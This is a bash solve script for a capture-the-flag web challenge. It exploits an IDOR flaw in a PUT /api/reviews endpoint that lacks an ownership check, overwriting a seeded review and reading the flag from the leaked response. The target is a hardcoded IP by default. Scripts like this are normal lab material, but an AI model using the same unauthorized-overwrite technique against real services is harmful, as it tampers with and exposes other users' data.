#!/usr/bin/env bash
# solve-web6-review-idor.sh — riffhack web6 (PUT /api/reviews IDOR)
#
# PUT /api/reviews/<id> has no ownership check. Any authed user can overwrite
# any review's text — and the response leaks the full row, including
# `moderationNote` which carries the flag for the seeded `seed-phantom-hacker`
# row.
#
# Usage: solve-web6-review-idor.sh <host>
set -euo pipefail

HOST="${1:-159.89.230.27}"
HERE="$(cd "$(dirname "$0")" && pwd)"
# shellcheck disable=SC1091
source "$HERE/lib/login.sh"

echo "[*] web6 (review IDOR) against $HOST"

COOKIE=$(login "$HOST")

echo "[*] PUT /api/reviews/seed-phantom-hacker (no ownership check)"
resp=$(curl -sk -b "$COOKIE" -X PUT -H 'Content-Type: application/json' \
       -d '{"reviewText":"y"}' \
       "http://$HOST/api/reviews/seed-phantom-hacker")

echo "[*] response (pretty):"
printf '%s\n' "$resp" | python3 -m json.tool || printf '%s\n' "$resp"

# The decoy here is the `fileHash` field on user-created reviews. The real
# flag is the `moderationNote` on the seed row.
flag=$(printf '%s\n' "$resp" \
       | python3 -c 'import json,sys; print(json.load(sys.stdin).get("moderationNote",""))' 2>/dev/null)

if [[ -z "$flag" ]]; then
  flag=$(printf '%s\n' "$resp" | grep -oE 'bitflag\{[^}]+\}' | head -1)
fi

if [[ -n "$flag" ]]; then
  echo "[+] FLAG: $flag"
else
  echo "[-] moderationNote not in response" >&2
  exit 1
fi
